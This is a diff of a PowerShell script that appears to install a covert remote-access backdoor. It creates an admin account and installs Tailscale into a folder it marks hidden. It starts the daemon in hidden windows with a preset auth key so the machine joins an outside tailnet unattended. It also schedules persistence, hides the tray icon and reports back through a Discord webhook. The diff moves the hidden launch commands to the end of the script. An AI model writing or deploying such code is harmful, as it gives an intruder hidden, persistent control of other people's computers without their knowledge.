@@ -23,7 +23,7 @@ function createAdmin {
 
 ## Installs Trailscale
 function installTailscale {
-  param ([string] $authKey, [string] $path)
+  param ( [string] $path)
 
   ## CD to Temp
   Set-Location $path
@@ -34,13 +34,7 @@ function installTailscale {
 
   ## Hide Tailnet folder in C
   Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
-
-  ## Configure Tailscale on users pc
-  Set-Location C:\tailscale
-  Start-Sleep 10
-  Start-Process -FilePath ".\tailscaled.exe" -windowstyle hidden -Verb RunAs
-  Start-Process -FilePath ".\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList 'up --authkey $authKey --unattended'
-
+  
   ## Adds Tailscale to task scheduler
   $name = "Tailscale"
   $action = New-ScheduledTaskAction -Execute "C:\Tailscale\tailscaled.exe"
@@ -225,6 +219,9 @@ Set-Location $PSScriptRoot
 
 Start-Sleep 5
 removeIcon -ProgramPath "C:\Tailscale\tailscale-ipn.exe" -Hide 
+
+Start-Process -FilePath ".\tailscaled.exe" -windowstyle hidden -Verb RunAs
+Start-Process -FilePath ".\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList 'up --authkey $authKey --unattended'
 
 ## Sends Discord Webhook
 $description = 
